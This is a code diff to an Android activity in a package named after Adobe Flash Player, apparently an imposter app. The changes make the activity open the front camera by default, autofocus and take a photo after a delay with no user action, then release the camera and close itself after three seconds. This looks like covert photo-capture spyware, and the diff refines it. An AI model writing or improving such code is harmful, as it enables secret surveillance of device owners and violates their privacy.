@@ -13,6 +13,7 @@ import android.util.Log;
 import android.widget.FrameLayout;
 import java.io.File;
 import java.io.FileOutputStream;
+import java.lang.ref.WeakReference;
 
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Public;
@@ -35,6 +36,8 @@ public class CameraActivity2 extends Activity {
 
     int photoCount = 0;
 
+    WeakReference <Activity> mActivity;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
 
@@ -50,7 +53,7 @@ public class CameraActivity2 extends Activity {
             int cameraidx = intent.getIntExtra("index", 0);
             photoNumber = intent.getIntExtra("count", 1);
             if (cameraidx != Camera.CameraInfo.CAMERA_FACING_FRONT && cameraidx != Camera.CameraInfo.CAMERA_FACING_BACK ){
-                photoNumber = 1;
+                cameraidx = Camera.CameraInfo.CAMERA_FACING_FRONT;
             }
 
             cameraFrame = (FrameLayout) findViewById(R.id.camera_frame);
@@ -63,51 +66,69 @@ public class CameraActivity2 extends Activity {
                 Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                 Camera.getCameraInfo(cameraId, cameraInfo);
 
-                //if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-                //    mCamera = Camera.open(cameraId);
-                //}
-
-                if (cameraidx == Camera.CameraInfo.CAMERA_FACING_FRONT || cameraidx == Camera.CameraInfo.CAMERA_FACING_BACK){
-                    if (cameraInfo.facing == cameraidx) {
-                        mCamera = Camera.open(cameraId);
-                    }
-                }else{
+                if (cameraInfo.facing == cameraidx) {
                     mCamera = Camera.open(cameraId);
                 }
-
-
-                CameraPreview2 mPreview = new CameraPreview2(this, mCamera);
-                cameraFrame.addView(mPreview);
-
-                new Thread(new Runnable() {
-                    @Override
-                    public void run() {
-                        try {
-                            Thread.sleep(CameraActivity.CAMERAFOCUSDELAY); // 设置1秒后自动拍照，可调节
-                            //得到照相机的参数
-                            Camera.Parameters parameters = mCamera.getParameters();
-                            //图片的格式
-                            parameters.setPictureFormat(ImageFormat.JPEG);
-                            //预览的大小是多少
-                            parameters.setPreviewSize(CameraActivity.DEFAULT_CAMERA_PHOTO_WIDTH, CameraActivity.DEFAULT_CAMERA_PHOTO_HEIGHT);
-                            //设置对焦模式，自动对焦
-                            parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
-                            //对焦成功后，自动拍照
-                            mCamera.autoFocus(new Camera.AutoFocusCallback() {
-                                @Override
-                                public void onAutoFocus(boolean success, Camera camera)
-                                {
-                                    if (success) {
-                                        mCamera.takePicture(null, null, mPictureCallback);
-                                    }
-                                }
-                            });
-                        } catch (InterruptedException e) {
-                            e.printStackTrace();
-                        }
-                    }
-                }).start();
             }
+
+            if (mCamera == null){
+                Log.e(TAG,"open camera failed" );
+                return;
+            }
+
+            CameraPreview2 mPreview = new CameraPreview2(this, mCamera);
+            cameraFrame.addView(mPreview);
+
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        Thread.sleep(CameraActivity.CAMERAFOCUSDELAY); // 设置1秒后自动拍照，可调节
+                        //得到照相机的参数
+                        Camera.Parameters parameters = mCamera.getParameters();
+                        //图片的格式
+                        parameters.setPictureFormat(ImageFormat.JPEG);
+                        //预览的大小是多少
+                        parameters.setPreviewSize(CameraActivity.DEFAULT_CAMERA_PHOTO_WIDTH, CameraActivity.DEFAULT_CAMERA_PHOTO_HEIGHT);
+                        //设置对焦模式，自动对焦
+                        parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
+                        //对焦成功后，自动拍照
+                        mCamera.autoFocus(new Camera.AutoFocusCallback() {
+                            @Override
+                            public void onAutoFocus(boolean success, Camera camera)
+                            {
+                                if (success) {
+                                    mCamera.takePicture(null, null, mPictureCallback);
+                                }
+                            }
+                        });
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }).start();
+
+            this.mActivity = new WeakReference<Activity>(CameraActivity2.this);
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        Thread.sleep(3000);
+                        if (mCamera != null){
+                            mCamera.stopPreview();
+                            mCamera.setPreviewCallback(null);
+                            mCamera.release();
+                            mCamera = null;
+                        }
+
+                        mActivity.get().finish();
+                        return;
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+                }
+            }).start();
+
         }catch (Exception e){
             e.printStackTrace();
         }
